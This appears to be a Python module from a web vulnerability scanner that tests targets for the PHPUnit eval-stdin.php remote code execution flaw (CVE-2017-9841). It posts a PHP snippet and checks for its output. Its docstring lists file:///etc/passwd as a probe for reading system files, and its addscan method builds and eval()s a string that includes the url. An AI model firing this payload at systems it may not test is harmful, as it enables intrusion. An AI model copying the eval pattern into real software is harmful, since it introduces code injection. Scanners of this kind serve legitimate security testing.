#!/usr/bin/env python3
# -*- coding:utf-8 -*-

'''
PHPUnit 是 PHP 语言中最常见的单元测试 (unit testing) 框架
    PHPUnit扫描类: 
        1. PHPUnit 远程代码执行
            CVE-2017-9841
                Payload: https://vulhub.org/#/environments/phpunit/CVE-2017-9841/

file:///etc/passwd
file:///C:/Windows/System32/drivers/etc/hosts
file:///C:\Windows\System32\drivers\etc\hosts
'''

from lib.api.dns import dns
from lib.initial.config import config
from lib.tool.md5 import md5, random_md5, random_int_1, random_int_2
from lib.tool.logger import logger
from lib.tool.thread import thread
from lib.tool import check
from thirdparty import requests
from time import sleep

class phpUint():
    def __init__(self):
        self.timeout = config.get('timeout')
        self.headers = config.get('headers')
        self.proxies = config.get('proxies')

        self.app_name = 'phpUint'
        self.md = md5(self.app_name)
        self.cmd = 'echo ' + self.md
        
        self.randint_1, self.randint_2 = random_int_2() # * 获取2个随机整数, 用于回显漏洞判断

        self.cve_2017_9841_payloads = [
            {
                'path': 'vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php',
                'data': '<?=print({}*{})?>'.format(self.randint_1, self.randint_2)
            },
        ]

    def cve_2017_9841_scan(self, url):
        '''  '''
        vul_info = {}
        vul_info['app_name'] = self.app_name
        vul_info['vul_type'] = 'RCE'
        vul_info['vul_id'] = 'CVE-2017-9841'
        # vul_info['vul_method'] = 'POST'
        vul_info['headers'] = {}

        # headers = self.headers.copy()
        # headers.update(vul_info['headers'])

        for payload in self.cve_2017_9841_payloads:
            path = payload['path']
            data = payload['data']
            target = url + path

            vul_info['path'] = path
            vul_info['data'] = data
            vul_info['target'] = target

            try:
                res = requests.post(
                    target, 
                    timeout=self.timeout, 
                    headers=self.headers,
                    data=data, 
                    proxies=self.proxies, 
                    verify=False,
                    allow_redirects=False
                )
                logger.logging(vul_info, res.status_code, res)                        # * LOG
            except requests.ConnectTimeout:
                logger.logging(vul_info, 'Timeout')
                return None
            except requests.ConnectionError:
                logger.logging(vul_info, 'Faild')
                return None
            except:
                logger.logging(vul_info, 'Error')
                return None

            if (str(self.randint_1 * self.randint_2) in res.text):
                results = {
                    'Target': target,
                    'Type': [vul_info['app_name'], vul_info['vul_type'], vul_info['vul_id']],
                    'Request': res
                }
                return results

    def addscan(self, url, vuln=None):
        if vuln:
            return eval('thread(target=self.{}_scan, url="{}")'.format(vuln, url))

        return [
            thread(target=self.cve_2017_9841_scan, url=url)
        ]

phpunit = phpUint()
